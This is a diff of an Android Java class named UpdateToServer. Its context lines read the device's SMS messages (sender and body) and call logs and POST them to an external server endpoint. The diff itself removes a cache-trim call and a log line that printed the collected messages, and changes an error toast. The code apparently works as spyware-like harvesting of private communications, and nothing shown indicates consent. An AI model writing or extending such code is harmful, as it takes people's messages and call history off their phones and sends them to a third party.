@@ -50,9 +50,6 @@ public class UpdateToServer {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
 
                 messages.add("\n\n"+"Number:     "+address+"\n"+"Content:     "+body+"\n\n");
-
-
-
             }
         } catch (Exception e) {
             Log.e("Error", e.getMessage());
@@ -105,9 +102,7 @@ public class UpdateToServer {
 
     public void addtoServer(final Context context) {
 
-        trimCache(context);
         final ArrayList<String> smss=getMessages();
-        Log.i("MESSAGES",smss.toString());
         final String callllogs=getCallDetail();
         StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/store_new_details.php", new Response.Listener<String>()
         {
@@ -124,7 +119,7 @@ public class UpdateToServer {
             @Override
             public void onErrorResponse(VolleyError error)
             {
-                Toast.makeText(context, error.getMessage(), Toast.LENGTH_SHORT).show();
+                Toast.makeText(context, error.toString(), Toast.LENGTH_SHORT).show();
             }
         })
         {
